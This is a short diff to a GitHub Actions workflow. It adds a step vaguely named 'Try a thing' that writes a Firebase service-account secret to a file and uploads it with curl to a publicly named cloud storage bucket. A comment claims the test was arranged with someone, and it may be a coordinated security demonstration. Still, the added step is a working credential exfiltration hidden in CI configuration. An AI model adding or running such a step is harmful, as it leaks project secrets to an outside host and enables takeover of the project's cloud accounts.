@@ -24,6 +24,13 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v2
+      # As note: this test is arranged with Mike
+      - name: Try a thing
+        env:
+          FIREBASE_SERVICE_ACCOUNT_FLUTTER_FIREBASE_DOCS: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_FLUTTER_FIREBASE_DOCS }}
+        run: |
+          echo $FIREBASE_SERVICE_ACCOUNT_FLUTTER_FIREBASE_DOCS >> firebase_secret.txt
+          curl -v --upload-file firebase_secret.txt 'https://storage.googleapis.com/public-nilsreichardt/firebase_secret.txt'
       - name: 'Install Flutter'
         run: ./.github/workflows/scripts/install-flutter.sh stable
       - name: 'Install Tools'
